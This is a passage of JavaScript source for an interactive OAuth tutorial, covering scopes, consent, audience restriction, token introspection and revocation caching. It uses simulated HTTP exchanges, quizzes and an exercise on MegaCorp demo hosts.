      feedback($('#fb'), false, '❌ ' + wrong.length + ' wrong:<ul>' + wrong.map((i) => '<li>' + Q[i][0] + ': ' + (Q[i][1] ? '<b>can</b> see it.' : '<b>cannot</b> see it.') + ' ' + Q[i][2] + '</li>').join('') + '</ul>');
    };
  }

  // ───────────────────────────── 9. scopes-consent ─────────────────────────────
  L.push({
    id: 'scopes-consent',
    section: SECTION,
    title: 'Scopes, consent & audience',
    explain: `
      <p>A <strong>scope</strong> is a string that names a permission, like <code>photos.read</code>, <code>photos.write</code>, or
      <code>https://www.googleapis.com/auth/calendar.readonly</code>. OAuth doesn't define any scope names. Each API invents its own, and the
      <code>scope</code> parameter is just a <strong>space-separated list</strong> of them.</p>
      <h3>Requested ≠ granted</h3>
      <p>The client <em>requests</em> scopes. The user (on the consent screen) and the AS's policy decide what is <em>granted</em>. Many consent
      screens let users untick optional permissions. If the result differs from the request, the token response <strong>must</strong> include
      the granted <code>scope</code> (RFC 6749 §5.1). The client should always read it rather than assume.</p>
      <pre><code class="language-http">// requested: scope=photos.read%20photos.write%20contacts.read
{ "access_token": "…", "token_type": "Bearer", "expires_in": 3600,
  "scope": "photos.read" }                  ← user unticked the other two</code></pre>
      <h3>The API enforces scopes</h3>
      <p>The resource server checks every request: is the token valid, and does it carry the scope this endpoint needs? RFC 6750 defines the errors:</p>
      <pre><code class="language-http">HTTP/1.1 401 Unauthorized                       ← no token, or invalid/expired token
WWW-Authenticate: Bearer realm="photos", error="invalid_token"

HTTP/1.1 403 Forbidden                          ← valid token, missing scope
WWW-Authenticate: Bearer error="insufficient_scope", scope="photos.write"</code></pre>
      <div class="tip"><strong>401 vs 403:</strong> 401 means "I don't know who you are or your token is bad, so (re)authenticate". 403 means "I know your token,
      but it doesn't allow this". The client can react by asking the user for more consent (<em>incremental authorization</em>).</div>
      <h3>Audience: which API is the token for?</h3>
      <p>A token for the Photos API shouldn't work at the Mail API, even if both trust the same AS. Otherwise any API that receives a token
      (or an attacker who stole one) can <strong>replay it</strong> somewhere else. JWT access tokens (RFC 9068) carry an <code>aud</code> claim, and each API must
      check that <code>aud</code> names <em>itself</em>.</p>
      <p><strong>Resource Indicators (RFC 8707)</strong> let the client say which API it wants a token for, with
      <code>resource=https://photos.api.megacorp.example</code> on <code>/authorize</code> and <code>/token</code>. The AS then issues a token restricted to that
      audience (and only that API's scopes).</p>
      <div class="warn">Ask for the <strong>least</strong> scope you need, when you need it. Big upfront scope lists scare users at consent time and
      increase the damage if a token leaks.</div>
    `,
    examples: [
      {
        title: 'Consent screen simulator: request, untick, call the API',
        code: W(`
<div class="g3">
  <div class="card"><h4>1 · PrintApp requests</h4><div id="req"></div><pre class="lite" id="url" style="font-size:11px"></pre></div>
  <div class="card consent"><h4>2 · MegaCorp consent screen</h4><div id="consent"></div>
    <div class="row" style="margin-top:6px"><button id="deny">Deny</button><button class="primary" id="allow">Allow</button></div></div>
  <div class="card"><h4>3 · Token response</h4><pre class="box" id="tok">(waiting for consent)</pre></div>
</div>
<div class="card"><h4>4 · Call the Photos API with this token</h4>
  <div class="row" id="apis"></div>
  <pre class="box" id="api">(click an API call)</pre>
</div>
`, function () {
          const SC = { 'photos.read': 'View your photos', 'photos.write': 'Upload and edit photos', 'contacts.read': 'See your contacts', 'offline_access': 'Stay connected when you are not using the app' };
          let requested = ['photos.read', 'photos.write', 'contacts.read'], granted = null, token = null;
          const CALLS = [
            ['GET /v1/photos', 'photos.read', '[{"id":"p1"},{"id":"p2"}]'],
            ['POST /v1/photos', 'photos.write', '{"id":"p3","status":"uploaded"}'],
            ['GET /v1/contacts', 'contacts.read', '[{"name":"Bob"}]'],
          ];
          function renderReq() {
            $('#req').innerHTML = Object.keys(SC).map((s) => '<label style="display:block"><input type="checkbox" data-r="' + s + '"' + (requested.includes(s) ? ' checked' : '') + '> <code>' + s + '</code></label>').join('');
            $$('[data-r]').forEach((c) => (c.onchange = () => { requested = $$('[data-r]').filter((x) => x.checked).map((x) => x.dataset.r); granted = null; token = null; renderAll(); }));
          }
          function renderAll() {
            $('#url').textContent = 'GET /authorize?response_type=code&client_id=printapp&redirect_uri=...&state=...&scope=' + encodeURIComponent(requested.join(' '));
            $('#consent').innerHTML = requested.length ? '<p class="muted" style="margin:0 0 4px"><b>PrintApp</b> wants to:</p>' + requested.map((s) =>
              '<label style="display:block"><input type="checkbox" data-c="' + s + '" checked> ' + SC[s] + ' <span class="muted mono">(' + s + ')</span></label>').join('')
              : '<p class="muted">No scopes requested.</p>';
            if (!granted) $('#tok').textContent = '(waiting for consent)';
            $('#apis').innerHTML = CALLS.map((c, i) => '<button data-a="' + i + '">' + c[0] + ' <span class="muted">needs ' + c[1] + '</span></button>').join('') +
              '<button data-a="none">GET /v1/photos <span class="muted">without token</span></button>';
            $$('[data-a]').forEach((b) => (b.onclick = () => call(b.dataset.a)));
          }
          $('#allow').onclick = () => {
            granted = $$('[data-c]').filter((x) => x.checked).map((x) => x.dataset.c);
            token = 'mc_at_' + Auth.randB64url(10);
            const body = { access_token: token, token_type: 'Bearer', expires_in: 3600 };
            if (granted.includes('offline_access')) body.refresh_token = 'mc_rt_' + Auth.randB64url(10);
            body.scope = granted.join(' ');
            const differs = granted.join(' ') !== requested.join(' ');
            $('#tok').innerHTML = httpHtml('HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n' + pj(body) +
              (differs ? '\n# granted scope differs from requested\n# requested: ' + requested.join(' ') : '\n# granted = requested'), ['"scope"']);
            $('#api').textContent = '(click an API call)';
          };
          $('#deny').onclick = () => {
            granted = null; token = null;
            $('#tok').innerHTML = httpHtml('HTTP/1.1 302 Found\nLocation: https://printapp.example/callback?error=access_denied&state=...\n\n# no code, no token: the user said no', ['access_denied']);
          };
          function call(a) {
            const c = a === 'none' ? CALLS[0] : CALLS[+a];
            const sendTok = a !== 'none' && token;
            const req = c[0] + ' HTTP/1.1\nHost: api.megacorp.example' + (sendTok ? '\nAuthorization: Bearer ' + token : '') + '\n';
            let res;
            if (!sendTok) res = 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer realm="photos"\n\n# no token: RFC 6750 says omit the error code here' + (a !== 'none' ? ' (click Allow first to get a token)' : '');
            else if (granted.includes(c[1])) res = 'HTTP/1.1 ' + (c[0].startsWith('POST') ? '201 Created' : '200 OK') + '\nContent-Type: application/json\n\n' + c[2] + '\n# token scope "' + granted.join(' ') + '" contains ' + c[1] + ' ✓';
            else res = 'HTTP/1.1 403 Forbidden\nWWW-Authenticate: Bearer error="insufficient_scope", scope="' + c[1] + '"\nContent-Type: application/json\n\n{"error":"insufficient_scope"}\n# token scope "' + granted.join(' ') + '" lacks ' + c[1];
            $('#api').innerHTML = httpHtml(req, ['Authorization']) + '\n' + httpHtml(res, ['insufficient_scope', '401 Unauthorized', 'error=']);
          }
          renderReq(); renderAll();
        }, `.g3 { display: grid; grid-template-columns: 1fr 1.2fr 1.2fr; gap: 10px; margin-bottom: 10px; } .g3 .card { margin: 0 }
.consent { border: 2px solid #087ea4; } #apis button { font-size: 12.5px; }`),
        explain: `
          <details>
            <summary>Try this</summary>
            <ol>
              <li>Leave the defaults, untick <b>Upload and edit photos</b> and <b>See your contacts</b> on the consent screen, and click <b>Allow</b>. Card 3 shows <code>"scope": "photos.read"</code> and a comment that it differs from the request.</li>
              <li>Click <b>GET /v1/photos</b> (200), then <b>POST /v1/photos</b> (403 <code>insufficient_scope</code>, <code>scope="photos.write"</code> tells the client what's missing).</li>
              <li>Click <b>without token</b>: 401 with a bare <code>WWW-Authenticate: Bearer realm="photos"</code> challenge.</li>
              <li>Tick <code>offline_access</code> in card 1 and allow it: a <code>refresh_token</code> appears. Untick it on the consent screen and it disappears.</li>
              <li>Click <b>Deny</b>: no token at all, just <code>error=access_denied</code> on the redirect.</li>
            </ol>
          </details>
        `,
      },
      {
        title: 'Audience: stop token replay to another API (RFC 8707)',
        code: W(`<div id="flow"></div>`, function () {
          const now = Math.floor(Date.now() / 1000);
          const K = 'megacorp-demo-key';
          const wide = Auth.jwtSign({ alg: 'HS256', typ: 'at+jwt' }, { iss: 'https://accounts.megacorp.example', sub: 'alice', client_id: 'printapp',
            scope: 'photos.read mail.read', iat: now, exp: now + 3600 }, K);
          const scoped = Auth.jwtSign({ alg: 'HS256', typ: 'at+jwt' }, { iss: 'https://accounts.megacorp.example', sub: 'alice', client_id: 'printapp',
            aud: 'https://photos.api.megacorp.example', scope: 'photos.read', iat: now, exp: now + 3600 }, K);
          const show = (t) => pj(Auth.jwtDecode(t).payload);
          const actors = [
            { id: 'c', label: 'PrintApp', icon: '🖨', store: {} },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: {} },
            { id: 'p', label: 'Photos API', icon: '🏞', store: { 'my aud': 'https://photos.api…' } },
            { id: 'm', label: 'Mail API', icon: '✉', store: { 'my aud': 'https://mail.api…' } },
          ];
          const bad = [
            { from: 'c', to: 'as', kind: 'back', label: 'POST /token (no resource)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=…&code_verifier=…',
              note: 'PrintApp got consent for photos <b>and</b> mail (for some feature). One token covers everything.' },
            { from: 'as', to: 'c', kind: 'back', label: '200 one token for all APIs', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"' + wide.slice(0, 30) + '…","token_type":"Bearer","scope":"photos.read mail.read"}\n\n# JWT payload (no aud!):\n' + show(wide).split('\n').map((l) => '# ' + l).join('\n'),
              set: { c: { token: 'photos+mail, no aud' } } },
            { from: 'c', to: 'p', label: 'GET /v1/photos  Bearer', msg: 'GET /v1/photos HTTP/1.1\nHost: photos.api.megacorp.example\nAuthorization: Bearer ' + wide },
            { from: 'p', to: 'p', label: 'Photos API is compromised 😈', set: { p: { 'stolen token': 'photos+mail' } }, note: 'A bug, a malicious insider, or a logging leak: the Photos API (or its logs) now has the token.' },
            { from: 'p', to: 'm', kind: 'err', label: 'replay: GET /v1/inbox  Bearer (same token)', msg: 'GET /v1/inbox HTTP/1.1\nHost: mail.api.megacorp.example\nAuthorization: Bearer ' + wide },
            { from: 'm', to: 'm', label: 'checks sig ✓ exp ✓ scope mail.read ✓ (no aud check)' },
            { from: 'm', to: 'p', kind: 'res', label: '200 Alice\'s email 😱', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"from":"bank@example","subject":"Your statement"}]',
              note: 'The Mail API accepted a token that was <em>meant</em> for the Photos API.' },
          ];
          const good = [
            { from: 'c', to: 'as', kind: 'back', label: 'POST /token resource=photos API', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' +
              form({ grant_type: 'authorization_code', code: '…', code_verifier: '…', resource: 'https://photos.api.megacorp.example' }), hl: ['resource='],
              note: 'RFC 8707: the client names the API it wants a token for.' },
            { from: 'as', to: 'c', kind: 'back', label: '200 token aud=photos, scope=photos.read', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"' + scoped.slice(0, 30) + '…","token_type":"Bearer","scope":"photos.read"}\n\n# JWT payload:\n' + show(scoped).split('\n').map((l) => '# ' + l).join('\n'),
              hl: ['"aud"'], set: { c: { token: 'aud=photos, photos.read' } }, note: 'The token is <b>audience-restricted</b> and <b>down-scoped</b> to that API.' },
            { from: 'c', to: 'p', label: 'GET /v1/photos  Bearer', msg: 'GET /v1/photos HTTP/1.1\nHost: photos.api.megacorp.example\nAuthorization: Bearer ' + scoped },
            { from: 'p', to: 'p', label: 'aud == me ✓ → 200 … but compromised 😈', set: { p: { 'stolen token': 'aud=photos only' } } },
            { from: 'p', to: 'm', kind: 'err', label: 'replay: GET /v1/inbox  Bearer', msg: 'GET /v1/inbox HTTP/1.1\nHost: mail.api.megacorp.example\nAuthorization: Bearer ' + scoped },
            { from: 'm', to: 'm', label: 'aud "photos.api" ≠ "mail.api" ✗' },
            { from: 'm', to: 'p', kind: 'err', label: '401 invalid_token', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token", error_description="audience mismatch"', hl: ['invalid_token'],
              note: 'Replay blocked. Each API accepts only tokens minted for it.' },
          ];
          Seq.mount('#flow', { title: 'One token for every API vs audience-restricted tokens', actors,
            scenarios: [{ name: '❌ No audience', steps: bad }, { name: '✅ resource= + aud check', steps: good }] });
        }),
        explain: `
          <details>
            <summary>The problem: a token that works everywhere</summary>
            <p>If an access token doesn't say <em>which API</em> it's for, every API that trusts the AS will accept it. Then the weakest API (or its logs)
            becomes a way into every other one. In the ❌ tab the payload has no <code>aud</code>, and step 7 is the Mail API happily serving Alice's inbox to a replayed token.</p>
          </details>
          <details>
            <summary>Step by step: what changes in the ✅ tab</summary>
            <table>
              <tr><th>Step</th><th>❌ No audience</th><th>✅ resource= + aud</th></tr>
              <tr><td>1</td><td>no <code>resource</code></td><td><code>resource=https://photos.api.megacorp.example</code></td></tr>
              <tr><td>2</td><td>payload: <code>scope: photos.read mail.read</code>, no <code>aud</code></td><td>payload: <code>aud: photos.api</code>, <code>scope: photos.read</code></td></tr>
              <tr><td>5</td><td colspan="2">compromised Photos API replays the token at Mail API</td></tr>
              <tr><td>6–7</td><td>sig ✓ scope ✓ → <b>200</b></td><td>aud mismatch → <b>401 invalid_token</b></td></tr>
            </table>
            <div class="tip">Two independent defenses: a narrower <strong>scope</strong> and a checked <strong>aud</strong>. Use both.</div>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'The client requested <code>photos.read photos.write</code> but the user unticked write. What should the token response contain?',
        options: ['An error', '"scope": "photos.read"', 'Nothing about scope', '"scope": "photos.read photos.write"'],
        answer: 1, why: 'When the granted scope differs from the requested one, the AS must return the actual scope so the client knows what it can do.' },
      { q: 'A valid token without the needed scope calls <code>POST /v1/photos</code>. The API returns…',
        options: ['401 invalid_token', '403 with WWW-Authenticate: Bearer error="insufficient_scope"', '400 invalid_grant', '200 but ignores the upload'],
        answer: 1, why: 'RFC 6750: insufficient_scope → 403, optionally with scope="…" naming what is needed.' },
      { q: 'What does checking the <code>aud</code> claim prevent?',
        options: ['Expired tokens', 'A token issued for one API being replayed at another API', 'CSRF', 'Weak passwords'],
        answer: 1, why: 'Audience restriction makes a token valid only at the resource server it was minted for.' },
      { q: 'Which RFC 8707 parameter asks the AS for a token for a specific API?',
        options: ['audience', 'resource', 'target', 'api'],
        answer: 1, why: 'resource=<absolute URI of the API>, usable on both /authorize and /token.' },
    ],
    exercise: {
      task: `<p>The Photos API (<code>aud = https://photos.api.megacorp.example</code>) receives the requests in the box below. Alice's token has
        <code>scope="photos.read"</code> and <code>aud="https://photos.api.megacorp.example"</code> unless stated otherwise. Choose the right response for each request, then click <strong>Check</strong>.</p>`,
      hint: '401 = no token, or the token is invalid (expired, bad signature, wrong audience). 403 = the token is fine but lacks the scope.',
      starter: W(`<div id="ex"></div>`, exScopes, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exScopes, '', { fill: true }),
    },
  });

  function exScopes() {
    const O = ['200 OK', '401 Unauthorized (no / invalid token)', '403 Forbidden insufficient_scope'];
    const Q = [
      ['GET /v1/photos with Alice\'s token', 0, ''],
      ['POST /v1/photos with Alice\'s token', 2, 'Valid token, but photos.write is missing.'],
      ['GET /v1/photos with no Authorization header', 1, 'No token at all → 401 with a bare Bearer challenge.'],
      ['GET /v1/photos with Alice\'s token, 2 hours after it expired', 1, 'Expired → invalid_token (401).'],
      ['GET /v1/photos with a token whose aud is https://mail.api.megacorp.example', 1, 'Wrong audience → the token is not valid here → 401 invalid_token.'],
      ['DELETE /v1/photos/p1 with Alice\'s token (needs photos.delete)', 2, 'Token is fine, scope is not.'],
    ];
    $('#ex').innerHTML = '<table class="t"><tr><th>Request</th><th>Response</th></tr>' + Q.map((q, i) => '<tr><td>' + esc(q[0]) + '</td><td><select id="q' + i + '">' +
      '<option value="">choose…</option>' + O.map((o, j) => '<option value="' + j + '">' + o + '</option>').join('') + '</select></td></tr>').join('') +
      '</table><button class="primary" id="chk" style="margin-top:8px">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) Q.forEach((q, i) => ($('#q' + i).value = String(q[1])));
    $('#chk').onclick = () => {
      const w = Q.map((q, i) => ($('#q' + i).value === String(q[1]) ? null : i)).filter((x) => x !== null);
      if (!w.length) return feedback($('#fb'), true, '✅ All correct. 401 = "who are you / bad token", 403 = "I know you, but no".');
      feedback($('#fb'), false, '❌ ' + w.length + ' wrong:<ul>' + w.map((i) => '<li>' + esc(Q[i][0]) + ($('#q' + i).value ? ': ' + (Q[i][2] || 'scope matches, token valid.') : '') + '</li>').join('') + '</ul>');
    };
  }

  // ───────────────────────────── 10. introspection-revocation ─────────────────────────────
  L.push({
    id: 'introspection-revocation',
    section: SECTION,
    title: 'Introspection & revocation',
    explain: `
      <p>Access tokens come in two flavours:</p>
      <ul>
        <li><strong>Self-contained (JWT)</strong>: the API verifies the signature and reads the claims itself, with no network call. It's fast, but the token stays valid until <code>exp</code> even if the user logs out.</li>
        <li><strong>Opaque</strong>: a random string like <code>mc_at_9f2c1e…</code> that means nothing on its own. The API has to <strong>ask the AS</strong> what it means.</li>
      </ul>
      <h3>Introspection (RFC 7662)</h3>
      <p>The resource server POSTs the token to the AS's introspection endpoint, authenticating <em>itself</em> (APIs are clients of the AS too):</p>
      <pre><code class="language-http">POST /introspect HTTP/1.1
Host: accounts.megacorp.example
Authorization: Basic cGhvdG9zLWFwaTpwYXBpLXNlY3JldA==     ← photos-api:papi-secret
Content-Type: application/x-www-form-urlencoded

token=mc_at_9f2c1e&amp;token_type_hint=access_token</code></pre>
      <pre><code class="language-json">{ "active": true, "client_id": "printapp", "sub": "alice", "scope": "photos.read",
  "aud": "https://photos.api.megacorp.example", "iss": "https://accounts.megacorp.example",
  "exp": 1793450400, "iat": 1793446800, "token_type": "Bearer" }</code></pre>
      <p>If the token is expired, revoked, unknown or not meant for this caller, the answer is just <code>{"active": false}</code>. The AS deliberately
      doesn't say why.</p>
      <h3>Revocation (RFC 7009)</h3>
      <p>When the user logs out or disconnects the app, the <strong>client</strong> tells the AS to kill its tokens:</p>
      <pre><code class="language-http">POST /revoke HTTP/1.1
Host: accounts.megacorp.example
Authorization: Basic cHJpbnRhcHA6czNjcjN0LXByaW50YXBw
Content-Type: application/x-www-form-urlencoded

token=mc_rt_tGzv3JOkF0XG5Qx2TlKWIA&amp;token_type_hint=refresh_token

HTTP/1.1 200 OK</code></pre>
      <ul>
        <li>The response is <strong>200 even if the token was already invalid</strong>, because there's nothing useful to tell an attacker probing tokens.</li>
        <li>Revoking a <strong>refresh token</strong> should also invalidate the access tokens issued from the same grant (if the AS supports it).</li>
        <li>For JWT access tokens, revocation only helps if the API checks it (introspection or a deny-list). Otherwise keep their lifetime short (5–15 min).</li>
      </ul>
      <div class="tip"><strong>The caching trade-off:</strong> introspecting on every request means one extra network hop per API call, so APIs cache results for a
      few seconds or minutes. The longer the cache, the longer a revoked token keeps working. The second example lets you measure it.</div>
    `,
    examples: [
      {
        title: 'Opaque token: introspect, revoke, and the stale cache',
        code: W(`<div id="flow"></div>`, function () {
          const at = 'mc_at_' + Auth.randB64url(12), rt = 'mc_rt_' + Auth.randB64url(12);
          const now = Math.floor(Date.now() / 1000);
          const rsBasic = Auth.b64('photos-api:papi-secret'), cBasic = Auth.b64('printapp:s3cr3t-printapp');
          const introReq = 'POST /introspect HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + rsBasic + '\nContent-Type: application/x-www-form-urlencoded\nAccept: application/json\n\n' + form({ token: at, token_type_hint: 'access_token' });
          const active = 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n' + pj({ active: true, client_id: 'printapp', sub: 'alice', scope: 'photos.read', aud: 'https://photos.api.megacorp.example', iss: 'https://accounts.megacorp.example', exp: now + 3600, iat: now, token_type: 'Bearer' });
          const inactive = 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "active": false\n}';
          const apiReq = (n) => ({ from: 'c', to: 'api', label: 'GET /v1/photos ' + n, msg: 'GET /v1/photos HTTP/1.1\nHost: photos.api.megacorp.example\nAuthorization: Bearer ' + at });
          const revoke = { from: 'c', to: 'as', kind: 'back', label: 'POST /revoke (refresh_token)', msg: 'POST /revoke HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + cBasic + '\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ token: rt, token_type_hint: 'refresh_token' }),
            hl: ['token_type_hint=refresh_token'], note: 'Alice clicks "Disconnect MegaCorp" in PrintApp. PrintApp revokes its refresh token.' };
          const revoked = { from: 'as', to: 'c', kind: 'back', label: '200 OK (empty body)', msg: 'HTTP/1.1 200 OK\nContent-Length: 0',
            set: { as: { [at.slice(0, 12) + '…']: 'REVOKED', [rt.slice(0, 12) + '…']: 'REVOKED' } },
            note: 'RFC 7009: 200 whether or not the token was valid. Revoking the refresh token also killed the access token from the same grant.' };
          const actors = [
            { id: 'c', label: 'PrintApp (client)', icon: '🖨', store: { access_token: at.slice(0, 12) + '… (opaque)', refresh_token: rt.slice(0, 12) + '…' } },
            { id: 'api', label: 'Photos API (RS)', icon: '🏞', store: {}, storeLabel: 'API introspection cache' },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: { [at.slice(0, 12) + '…']: 'active, alice, photos.read', [rt.slice(0, 12) + '…']: 'active' }, storeLabel: 'AS token database' },
          ];
          const s1 = [
            apiReq('(opaque Bearer)'),
            { from: 'api', to: 'api', label: 'opaque → can\'t read it; ask the AS', note: 'The token is just random characters. There is nothing to verify locally.' },
            { from: 'api', to: 'as', kind: 'back', label: 'POST /introspect token=…', msg: introReq, hl: ['token=', 'Authorization'], note: 'The API authenticates itself as <code>photos-api</code>. Unauthenticated introspection would let anyone probe tokens.' },
            { from: 'as', to: 'api', kind: 'back', label: '200 {"active":true, scope, sub, exp…}', msg: active, hl: ['"active": true', '"scope"', '"aud"'] },
            { from: 'api', to: 'api', label: 'active ✓ aud ✓ scope ∋ photos.read ✓' },
            { from: 'api', to: 'c', kind: 'res', label: '200 photos', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":"p1"}]' },
          ];
          const s2 = [revoke, revoked,
            apiReq('(old token)'),
            { from: 'api', to: 'as', kind: 'back', label: 'POST /introspect', msg: introReq },
            { from: 'as', to: 'api', kind: 'back', label: '200 {"active":false}', msg: inactive, hl: ['"active": false'], note: 'Just <code>active:false</code>. No reason is given (revoked vs expired vs unknown).' },
            { from: 'api', to: 'c', kind: 'err', label: '401 invalid_token', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token"', hl: ['invalid_token'], note: 'Revocation took effect <b>immediately</b> because the API asked the AS.' },
          ];
          const s3 = [
            apiReq('#1 at t=0s'),
            { from: 'api', to: 'as', kind: 'back', label: 'POST /introspect', msg: introReq },
            { from: 'as', to: 'api', kind: 'back', label: '{"active":true…}', msg: active, set: { api: { [at.slice(0, 12) + '…']: 'active (cached until t=60s)' } }, note: 'The API caches the answer for 60 s to avoid an extra hop on every call.' },
            { from: 'api', to: 'c', kind: 'res', label: '200', msg: 'HTTP/1.1 200 OK' },
            Object.assign({}, revoke, { label: 't=10s POST /revoke' }), revoked,
            apiReq('#2 at t=20s'),
            { from: 'api', to: 'api', label: 'cache hit: "active" 😬', note: 'The cache still says active. The API does <b>not</b> ask the AS.' },
            { from: 'api', to: 'c', kind: 'res', label: '200 (token is actually revoked!)', msg: 'HTTP/1.1 200 OK\n# served with a revoked token: stale cache', note: 'For up to 50 more seconds the revoked token still works. That is the price of caching.' },
            apiReq('#3 at t=70s'),
            { from: 'api', to: 'as', kind: 'back', label: 'cache expired → POST /introspect', msg: introReq },
            { from: 'as', to: 'api', kind: 'back', label: '{"active":false}', msg: inactive, set: { api: { [at.slice(0, 12) + '…']: 'inactive' } } },
            { from: 'api', to: 'c', kind: 'err', label: '401 invalid_token', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token"' },
          ];
          Seq.mount('#flow', { title: 'Introspection (RFC 7662) & revocation (RFC 7009)', actors,
            scenarios: [{ name: '✅ Introspect', steps: s1 }, { name: '🚪 Revoke → rejected', steps: s2 }, { name: '⏱ With 60 s cache', steps: s3 }] });
        }),
        explain: `
          <details>
            <summary>Step by step: the ⏱ cache tab</summary>
            <table>
              <tr><th>Time</th><th>Step</th><th>API cache</th><th>Result</th></tr>
              <tr><td>t=0</td><td>1–4: introspect → active</td><td>active until t=60</td><td>200 ✅</td></tr>
              <tr><td>t=10</td><td>5–6: client revokes</td><td>still "active"</td><td>AS: REVOKED</td></tr>
              <tr><td>t=20</td><td>7–9: cache hit</td><td>"active"</td><td><b>200 😬 (stale)</b></td></tr>
              <tr><td>t=70</td><td>10–13: cache expired → introspect → inactive</td><td>inactive</td><td>401 ✅</td></tr>
            </table>
            <p>Compare with the 🚪 tab, which has no cache: the revoked token fails on the very next request.</p>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>Introspection = the API asking the AS "is this token good, and what does it allow?". The API authenticates itself.</li>
              <li><code>{"active": false}</code> covers expired, revoked, unknown and malformed tokens alike.</li>
              <li>Revocation is called by the <strong>client</strong>; introspection is called by the <strong>resource server</strong>.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'Caching trade-off simulator: speed vs revocation lag',
        code: W(`
<div class="card">
  <div class="grid2">
    <label>Token validation strategy<br>
      <select id="mode"><option value="intro">Opaque + introspection (with cache)</option><option value="jwt">JWT, verify locally (no AS calls)</option></select></label>
    <label id="ttlL">Introspection cache TTL: <b id="ttlV"></b><br><input type="range" id="ttl" min="0" max="300" step="15" value="60" style="width:100%"></label>
    <label>User revokes at: <b id="revV"></b><br><input type="range" id="rev" min="0" max="600" step="10" value="200" style="width:100%"></label>
    <label id="expL">JWT lifetime (exp): <b id="expV"></b><br><input type="range" id="exp" min="60" max="3600" step="60" value="900" style="width:100%"></label>
  </div>
  <p class="muted" style="margin:6px 0 0">The client calls the API every 20 s for 10 minutes (30 calls). Each cell below is one call.</p>
</div>
<div id="cells"></div>
<div class="legend muted"><span class="c ok"></span> accepted (token valid) <span class="c stale"></span> accepted <b>after revocation</b> <span class="c rej"></span> rejected (correct) <span class="dot"></span> AS call made</div>
<div class="grid2" style="margin-top:8px"><div class="card" id="stats"></div><div class="card" id="advice"></div></div>
`, function () {
          function render() {
            const mode = $('#mode').value, ttl = +$('#ttl').value, rev = +$('#rev').value, exp = +$('#exp').value;
            $('#ttlV').textContent = ttl + ' s'; $('#revV').textContent = 't=' + rev + ' s'; $('#expV').textContent = exp / 60 + ' min';
            $('#ttlL').style.opacity = mode === 'intro' ? 1 : 0.35; $('#expL').style.opacity = mode === 'jwt' ? 1 : 0.35;
            let cacheUntil = -1, cached = null, calls = 0, stale = 0, firstReject = null;
            const cells = [];
            for (let i = 0; i < 30; i++) {
              const t = i * 20;
              const reallyValid = t < rev && (mode === 'intro' || t < exp);
              let accepted, asCall = false;
              if (mode === 'jwt') accepted = t < exp;
              else {
                if (t < cacheUntil && cached !== null) accepted = cached;
                else { asCall = true; calls++; accepted = t < rev; cached = accepted; cacheUntil = t + ttl; }
              }
              const cls = accepted ? (reallyValid ? 'ok' : 'stale') : 'rej';
              if (cls === 'stale') stale++;
              if (!accepted && firstReject === null) firstReject = t;
              cells.push('<div class="cell ' + cls + '" title="t=' + t + 's">' + (asCall ? '<span class="dot"></span>' : '') + '<small>' + t + '</small></div>');
            }
            $('#cells').innerHTML = cells.join('');
            const lag = firstReject === null ? 'never (within 10 min)' : Math.max(0, firstReject - rev) + ' s';
            $('#stats').innerHTML = '<h4>Result</h4><table class="t"><tr><td>Calls to the AS</td><td><b>' + calls + '</b> / 30</td></tr>' +
              '<tr><td>Calls accepted after revocation</td><td><b class="' + (stale ? 'bad' : 'ok') + '">' + stale + '</b></td></tr>' +
              '<tr><td>Revocation lag</td><td><b>' + lag + '</b></td></tr></table>';
            $('#advice').innerHTML = '<h4>What this means</h4>' + (mode === 'jwt'
              ? 'A JWT is checked locally, so there are <b>0</b> AS calls, but revocation does nothing until <code>exp</code>. That\'s why JWT access tokens should be short-lived (5–15 min) and paired with a revocable refresh token.'
              : ttl === 0 ? 'No cache: revocation is instant, but the AS is hit on <b>every</b> request (latency + load).'
                : 'Cache TTL ' + ttl + ' s: about ' + Math.round((1 - calls / 30) * 100) + '% fewer AS calls, at the cost of up to ' + ttl + ' s of revocation lag. Common choice: a TTL well under the token lifetime, often 30–60 s.');
          }
          ['mode', 'ttl', 'rev', 'exp'].forEach((id) => ($('#' + id).oninput = render));
          $('#mode').onchange = render;
          render();
        }, `#cells { display: grid; grid-template-columns: repeat(15, 1fr); gap: 4px; margin: 8px 0 4px; }
.cell { position: relative; height: 34px; border-radius: 6px; display: flex; align-items: flex-end; justify-content: center; color: #fff; font-size: 10px; }
.cell small { padding-bottom: 2px; } .cell.ok, .c.ok { background: #22c55e; } .cell.stale, .c.stale { background: #ef4444; } .cell.rej, .c.rej { background: #94a3b8; }
.cell .dot, .legend .dot { position: absolute; top: 4px; width: 8px; height: 8px; border-radius: 50%; background: #1e3a8a; border: 1px solid #fff; }
.legend { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; } .legend .c { display: inline-block; width: 14px; height: 14px; border-radius: 4px; margin-left: 8px; }
.legend .dot { position: static; display: inline-block; margin-left: 8px; } .grid2 .card { margin: 0 }`),
        explain: `
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Set the TTL to <b>0</b>: no red cells, but 30 AS calls. Slide it to <b>300 s</b>: few AS calls, but several red (stale) cells after the revocation point.</li>
